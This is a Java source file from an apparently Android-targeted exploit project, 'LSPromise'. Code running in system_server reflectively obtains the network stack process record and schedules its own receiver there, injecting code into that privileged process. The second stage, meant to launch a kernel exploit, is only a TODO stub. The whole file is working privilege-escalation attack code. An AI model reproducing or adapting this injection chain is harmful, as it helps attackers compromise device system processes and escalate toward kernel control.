package org.lsposed.lspromise;

import android.app.ActivityThread;
import android.app.IApplicationThread;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.os.Process;
import android.os.ServiceManager;
import android.util.Log;

import java.lang.reflect.Method;

public class Shellcode extends BroadcastReceiver {
    private static final String TAG = "LSPromise";
    private static final int NETWORK_STACK_UID = 1073;
    public static void onAppComponentFactoryLoaded() {
        int uid = Process.myUid();
        String processName = Process.myProcessName();
        Log.e(TAG, "Shell code has been executed in " + uid + " process " + processName);
        if (uid == Process.SYSTEM_UID) {
            // In system_server
            stage1();
        }
    }

    /**
     * To be executed in system_process process, to inject code into network stack
     */
    private static void stage1() {
        try {
            Log.e(TAG, "in system server, stage 1");
            ApplicationInfo appInfo = ActivityThread.currentApplication()
                    .getPackageManager()
                    .getApplicationInfo(BuildConfig.APPLICATION_ID, 0);
            ActivityInfo receiverInfo = new ActivityInfo();
            receiverInfo.applicationInfo = appInfo;
            receiverInfo.name = Shellcode.class.getName();
            Intent intent = new Intent().setClassName(appInfo.packageName, receiverInfo.name);

            Object activityManagerService = ServiceManager.getService(Context.ACTIVITY_SERVICE);
            ClassLoader classLoader = activityManagerService.getClass().getClassLoader();
            Class<?> ActivityManagerService = classLoader.loadClass("com.android.server.am.ActivityManagerService");
            Method getProcessRecordLocked = ActivityManagerService.getDeclaredMethod("getProcessRecordLocked", String.class, int.class);
            getProcessRecordLocked.setAccessible(true);
            Object networkStackProcessRecord;
            synchronized (activityManagerService) {
                networkStackProcessRecord = getProcessRecordLocked.invoke(
                        activityManagerService, "com.android.networkstack.process", NETWORK_STACK_UID);
            }
            Method getOnewayThread = getProcessRecordLocked.getReturnType().getDeclaredMethod("getOnewayThread");
            getOnewayThread.setAccessible(true);
            IApplicationThread appThread = (IApplicationThread) getOnewayThread.invoke(networkStackProcessRecord);
            appThread.scheduleReceiver(intent, receiverInfo, null, 0,
                    null, null, false, false, 0,
                    0, Process.SYSTEM_UID, "android");
        } catch (Exception e) {
            Log.e(TAG, "Failed to inject network stack", e);
        }
    }

    /**
     * To be executed in network stack process, to launch kernel exploit
     */
    private static void stage2() {
        Log.e(TAG, "in network stack, stage 2");
        // TODO add kernel exploit
    }

    @Override public void onReceive(Context context, Intent intent) {
        // In network stack
        stage2();
    }
}
